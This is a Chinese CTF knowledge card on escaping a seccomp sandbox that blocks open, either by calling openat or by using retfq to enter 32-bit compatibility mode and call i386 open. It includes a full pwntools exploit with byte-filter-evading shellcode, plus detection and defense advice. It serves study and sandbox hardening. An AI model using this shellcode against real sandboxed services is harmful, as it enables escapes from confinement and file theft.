---
id: binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open
title: ORW 缺 open：openat 替代，或 retfq 切 32 位兼容模式调用 i386 open 再切回 64 位 read/write
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: orw-missing-open-openat-retfq-i386-open
aliases:
- ORW 缺 O
- seccomp 禁 open 读 flag
- retfq 切 32 位 open
- int 0x80 open
- i386 兼容模式 ORW
- openat 257 绕过
tags:
- binary
- pwn
- shellcode
- orw
- seccomp
- sandbox-escape
- retfq
- i386
- openat
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:35:36+08:00'
  notes: 已对照原文（无图片）核对：ORW缺O的openat(257)、retfq切i386（CS=0x23/0x33）、mmap 0x40404040+esp 0x40404140、32位open(eax=5,int 0x80)结果存ecx、二次retfq回64位read/write、0x17+0x29+0x9=0x49对齐回程地址，均与原文exp一致。未验证点：未运行exp；原文mmap注释flags=34与代码r8=0不一致，卡内保留原文代码。
---

## 一句话结论

当 64 位 `open`(2) 被 seccomp/白名单禁止时，若 `openat`(257) 仍可用，直接改调 `openat(AT_FDCWD, "flag", O_RDONLY)`；若连 `openat` 也被 64 位规则堵住且过滤器未校验 `arch`，可用 `retfq`（远返回，CS=0x23）切到 i386 兼容模式执行 32 位 `open`（`eax=5; int 0x80`），把返回 fd 存入 `ecx`，再第二次 `retfq` 切回 64 位执行 `read`/`write` 输出 flag。

## 原理

- **同一能力的不同 ABI**：x86-64 的 `open` 是 2、`openat` 是 257；i386 兼容模式的 `open` 是 5、`read` 是 3、`write` 是 4。seccomp 若只按 64 位调用号或只按 `open` 名称封锁，32 位兼容模式的调用号不在名单内，会直接放行——这与只禁 `read`/`write` 时可换 `preadv`/`writev` 是同一类过滤粒度问题。
- **retfq 如何切模式**：x86-64 的 `retfq`（far return）先从栈弹出 RIP，再弹出 CS。把目标地址（32 位可表示的地址）放在 `[rsp]`、`0x23`（`__USER32_CS`，32 位用户代码段，RPL=3）放在 `[rsp+8]`，即可跳入 i386 兼容模式。切回 64 位则用 `push 0x33; push addr; retfq`（CS=0x33 为 64 位用户代码段）。
- **地址截断陷阱**：进入 32 位模式后地址按 32 位规则解析，原来的 `rsp=0x7ffe530d01b8` 会变成 `esp=0x530d01b8`。因此不能把 32 位 shellcode 直接放在 64 位栈上（64 位栈地址在 32 位模式下无法解析，retfq 会 crash）；必须先用 64 位 `mmap` 申请一段低于 4GB 的可执行内存（原文用 `0x40404040`），把 32 位 shellcode 放进去。
- **模式切换会破坏寄存器**：`retfq` 返回 64 位时会改变 `rax`，所以 32 位 `open` 的返回值必须提前存到别的寄存器（原文存 `ecx`），切回后再 `mov rdi, rcx` 作为 `read` 的 fd。
- **页对齐与长度**：原文 `mmap(0x40404040, 0x7e, 7, 34, 0, 0)` 映射 RWX 页（0x40404040 非页对齐时内核会向下取整，但地址仍可用），长度 0x7e 足够放 32 位 open 阶段与 64 位回程阶段；32 位 shellcode 的 `esp` 也要设成 32 位可解析的地址（如 `0x40404140`）。
- **可见字符/字节过滤下的构造**：原文注释显示该题还限制 shellcode 字节（如 `\xcb` 不能出现，且 syscall 的 `0f 05` 需用异或凑出），因此 `push`/`xor byte ptr` 既用于构造 `retfq` 机器码也用于拼出 `syscall`；这是实现细节，不是 retfq 原理本身。
- **边界**：需要内核启用 IA32 兼容（`CONFIG_IA32_EMULATION`）且 CPU 支持；32 位目标地址必须低于 4GB；若 seccomp 额外比较 `arch` 或把 i386 系统调用号也列入黑名单，该绕过失效；若 `mmap` 被禁或无法获得可执行页，也无法放置 32 位代码。

## 触发条件

- 用户可执行 shellcode，flag 路径已知（如 `"flag"`），且 `read`/`write` 可用。
- 64 位 `open`(2) 被禁，`openat`(257) 不可用或同样被禁；过滤器没有校验 `arch`（只比较 `sys_number`）或没有把 i386 `open`=5 列入黑名单。
- 允许 `mmap`（至少一次）以获得低于 4GB 的可执行内存；允许 `read` 从 stdin 读入第二阶段 shellcode。
- 目标为 64 位进程且内核支持 i386 兼容模式；`retfq` 目标地址与栈布局可构造。
- 若同时存在字节/长度过滤，需要额外的可见字符编码或自修改构造。

## 利用步骤

1. `seccomp-tools dump` 确认过滤器是否检查 `arch`，以及 64 位 `open`/`openat` 是否被禁、i386 系统调用号是否被覆盖。
2. 先尝试最简单方案：直接 `openat(AT_FDCWD, "flag", O_RDONLY)`（号 257），成功则继续 64 位 `read`/`write`，无需切模式。
3. 若 `openat` 也不可用：用 64 位 shellcode 调 `mmap(0x40404040, 0x7e, 7, 34, 0, 0)` 申请 RWX 内存，并 `read(0, 0x40404040, 0x70)` 读入 32 位 shellcode。
4. 构造第一次 `retfq`：在栈上放 `[目标32位地址, 0x23]`，跳入 32 位模式；32 位 shellcode 先把 `esp` 设为 32 位可用地址（如 `0x40404140`），压入 `"flag"` 字符串，`eax=5; ebx=字符串地址; ecx=0; int 0x80` 调 i386 `open`，把 `eax`（fd）存入 `ecx`。
5. 构造第二次 `retfq`：`push 0x33; push <64位回程地址>; retfq` 切回 64 位；回程 shellcode 用 `mov rdi, rcx` 恢复 fd，`read(fd, rsp, 0x70)` 读文件，`write(1, buf, 0x70)` 输出。
6. 按目标字节过滤调整 shellcode（用 `push imm; pop reg` 与 `xor byte ptr [addr], imm` 凑出 `retfq`/`syscall` 字节，必要时补 `nop` 对齐回程地址）。
7. 发送完整 shellcode，读取 flag；本地先用 `strace`/`seccomp-tools` 复核模式切换与调用号。

## PoC

原文 exp（pwntools；为便于阅读保留关键结构，原文还包含大量为通过字节检查而做的异或构造）：

```python
from pwn import *
context(log_level='debug')
p = process('./shellcode')
p.recvuntil("shellcode: ")

append = '''
push rdx
pop rdx
'''
# 0x40404040 为 32 位 shellcode 地址
# 长度 0x31，[rbx+0x31]/[rbx+0x32] 用 xor 凑出 syscall(0f 05)
shellcode_mmap = '''
/* mmap(0x40404040,0x7e,7,34,0,0) */
push 0x40404040
pop rdi
push 0x7e
pop rsi
push 0x40
pop rax
xor al,0x47
push rax
pop rdx
push 0x40
pop rax
xor al,0x40
push rax
pop r8
push rax
pop r9
/* 用 rbx(mmap 返回地址) 指向的位置异或出 syscall */
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32],cl
push 0x22
pop rcx
push 0x40
pop rax
xor al,0x49
'''

# 长度 0x24，[rbx+0x57]/[rbx+0x58] 为 syscall
shellcode_read = '''
/* read(0,0x40404040,0x70) */
push 0x40404040
pop rsi
push 0x40
pop rax
xor al,0x40
push rax
pop rdi
xor al,0x40
push 0x70
pop rdx
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl
push rdx
pop rax
xor al,0x70
'''

# 长度 0x27；0x52^0x72^0x68=0x48 且 0x5a-0x47-0x48=0xcb，
# 让 [rbx+0x80]/[rbx+0x81] 变成 retfq 的机器码 48 cb
shellcode_retfq = '''
push rbx
pop rax
xor al,0x40
push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

# 32 位阶段：fp = open("flag")，结果存 ecx
shellcode_x86 = '''
mov esp,0x40404140
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''

# 第二次 retfq 回 64 位：push 0x33; push 0x40404089; retfq
# read(fp,buf,0x70) + write(1,buf,0x70)
shellcode_flag = '''
push 0x33
push 0x40404089
retfq
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall
mov rdi,1
mov rax,1
syscall
'''

shellcode  = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append
shellcode  = asm(shellcode, arch='amd64', os='linux')
p.sendline(shellcode)

shellcode_x86  = asm(shellcode_x86)
shellcode_flag = asm(shellcode_flag, arch='amd64', os='linux')
p.sendline(shellcode_x86 + 0x29*b'\x90' + shellcode_flag)
p.interactive()
```

要点：`0x17 + 0x29 + 0x9 = 0x49`，32 位阶段 0x17 字节、`nop` 0x29 字节后回程地址恰为 `0x40404089`；`retfq` 序列 `push 0x33; push 0x40404089; retfq` 共 9 字节。

## 变体与关联

- **openat 直接替代**：若只禁 `open` 而未禁 `openat`，无需切模式，`openat(AT_FDCWD=0, "flag", 0)` 更简单（号 257）。
- **32 位模式直接 ORW**：若过滤器对 i386 `read`/`write` 也放行，可全程留在 32 位完成 open/read/write，不必第二次 retfq；原文因 32 位 `read`/`write` 报 `bad system call` 才切回 64 位，说明该题黑名单覆盖了 i386 的 3/4 号调用。
- **retf 切模式做 execve**：同一 `retf`/CS=0x23 原语也可用于 i386 `execve`(11) 绕过 64 位 `execve`(59)，见 [[binary-pwn-sandbox-escape-seccomp-no-arch-check-i386-compat-execve]]（目标系统调用与后续链不同）。
- **打开也被完全封死**：用 `openat2`+`pipe`/`splice` 或侧信道，见 [[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]、[[binary-pwn-sandbox-escape-chroot-openat-fd-exit-status-sidechannel]]。
- **读/写替代**：见 [[binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap]]、[[binary-pwn-sandbox-escape-orw-missing-write-writev-pwritev]]。
- **关联**：[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（可见字符构造）、[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（字节扫描绕过）。

## 检测与防御

- **检测（出题/防守）**：seccomp 过滤器应加载并比较 `arch`（`AUDIT_ARCH_X86_64`），把 i386 兼容模式的系统调用号也纳入同一策略；运行时监控 `retfq`/远返回指令、`int 0x80` 在 64 位进程中的出现，以及 `mmap` 低于 4GB 的 RWX 页后 `read` 可执行代码的行为。
- **防御**：白名单按能力限制（让 32/64 位两套 ABI 的 open/read/write 都不可用，或只允许 `write` 到固定 fd）；若不需要 32 位兼容，禁用 IA32 模拟（内核 `CONFIG_IA32_EMULATION=n` 或容器 seccomp 直接拒绝 i386 调用号）；关键 flag 由父进程读取后传入，减少文件打开面。
- **注意**：只禁 64 位 `open` 而放行 32 位 `open` 等价于没有禁打开；只检查 `sys_number` 不检查 `arch` 是同类漏洞的根因。
